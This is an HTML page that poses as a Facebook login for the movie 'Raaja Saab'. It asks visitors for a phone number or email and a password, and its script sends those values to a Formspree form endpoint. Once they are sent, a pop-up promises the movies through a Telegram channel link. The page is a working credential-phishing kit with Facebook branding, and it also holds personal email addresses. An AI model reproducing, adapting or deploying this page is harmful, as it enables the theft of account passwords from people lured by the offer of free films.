<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RAAJA SAAB MOVIE LOGIN</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        /* Background image with overlay */
        body {
            margin: 0;
            padding: 0;
            background: url('1000218930.webp') no-repeat center center fixed;
            background-size: cover;
            position: relative;
            min-height: 100vh;
            font-family: Arial, sans-serif;
        }
        /* Dark overlay over the background */
        body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.6); /* dark overlay */
            z-index: -1;
        }
        .container {
            position: relative;
            z-index: 1;
            max-width: 400px;
            margin: 50px auto;
            background: rgba(255, 255, 255, 0.9); /* semi-transparent white */
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0,0,0,0.3);
        }
        .header h1 {
            color: #333;
            text-align: center;
        }
        .form-container {
            margin-top: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        .form-group input {
            width: 100%;
            padding: 8px;
            box-sizing: border-box;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .submit-btn {
            background-color: #1877f2;
            color: white;
            border: none;
            padding: 10px 20px;
            width: 100%;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        .submit-btn:hover {
            background-color: #166fe5;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #666;
        }
        /* Modal styling (same as before) */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.5);
        }
        .modal-content {
            background-color: #fff;
            margin: 15% auto;
            padding: 20px;
            border: 1px solid #888;
            width: 300px;
            text-align: center;
            border-radius: 10px;
        }
        .modal-content a {
            display: inline-block;
            background-color: #0088cc;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            text-decoration: none;
            font-weight: bold;
            margin-top: 15px;
        }
        .modal-content .close {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }
        .error-message {
            color: red;
            font-size: 14px;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1><i class="fab fa-facebook"></i> RAAJA SAAB MOVIE LOGIN </h1>
        </div>
        
        <div class="form-container">
            <h2>Enter your details</h2>
            <form id="nicknameForm">
                <!-- Formspree endpoint (using AJAX) -->
                <input type="hidden" name="_subject" value="New Nickname Submission from Website">
                <input type="hidden" name="_replyto" value="lamiyactg7@gmail.com">
                
                <div class="form-group">
                    <label for="name">Enter your Phone Or Email:</label>
                    <input type="text" id="name" name="name" required>
                    <div id="nameError" class="error-message"></div>
                </div>
                
                <div class="form-group">
                    <label for="nickname">Enter your Password:</label>
                    <input type="text" id="nickname" name="nickname" required>
                </div>
                
                <input type="text" name="_gotcha" style="display:none"> <!-- Anti-spam -->
                
                <button type="submit" class="submit-btn">Submit</button>
            </form>
            
            <div id="message" class="message"></div>
        </div>
        
        <div class="footer">
            <p>© 2025 Facebook Movies Login. All rights reserved.</p>
        </div>
    </div>

    <!-- Telegram Pop-up Modal -->
    <div id="telegramModal" class="modal">
        <div class="modal-content">
            <span class="close" id="closeModal">&times;</span>
            <i class="fab fa-telegram-plane" style="font-size: 48px; color: #0088cc;"></i>
            <h3>Join our Telegram Channel</h3>
            <p>Click the button below to access all uploaded movies:</p>
            <a href="https://t.me/+ASSTI5EqDJ1kZDc1" target="_blank" rel="noopener noreferrer">
                <i class="fab fa-telegram-plane"></i> Go to Telegram
            </a>
        </div>
    </div>
    
    <script>
        // Function to validate Bangladeshi phone number or specific email
        function validateBangladeshiContact(input) {
            // Exact email match
            if (input === 'sumaiyasultana8034@gmail.com') {
                return true;
            }
            // Bangladeshi phone regex (01XXXXXXXXX or +8801XXXXXXXXX)
            const bdPhoneRegex = /^(?:\+88|01)?\d{11}$/;
            const clean = input.replace(/\s+/g, '');
            if (bdPhoneRegex.test(clean)) {
                if (clean.startsWith('01') && clean.length === 11) return true;
                if (clean.startsWith('+8801') && clean.length === 14) return true;
            }
            return false;
        }

        document.getElementById('nicknameForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const contact = document.getElementById('name').value.trim();
            const errorDiv = document.getElementById('nameError');
            
            if (!validateBangladeshiContact(contact)) {
                errorDiv.textContent = 'Please enter a valid Bangladeshi number (e.g., 01XXXXXXXXX) or the specific email.';
                return;
            } else {
                errorDiv.textContent = '';
            }

            const formData = new FormData(this);

            fetch('https://formspree.io/f/mwpbelyk', {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            })
            .then(response => {
                if (response.ok) {
                    document.getElementById('telegramModal').style.display = 'block';
                    document.getElementById('nicknameForm').reset();
                } else {
                    document.getElementById('message').textContent = 'Submission failed. Please try again.';
                }
            })
            .catch(error => {
                document.getElementById('message').textContent = 'Error: ' + error.message;
            });
        });

        document.getElementById('closeModal').onclick = function() {
            document.getElementById('telegramModal').style.display = 'none';
        }

        window.onclick = function(event) {
            const modal = document.getElementById('telegramModal');
            if (event.target == modal) {
                modal.style.display = 'none';
            }
        }
    </script>
</body>
</html>
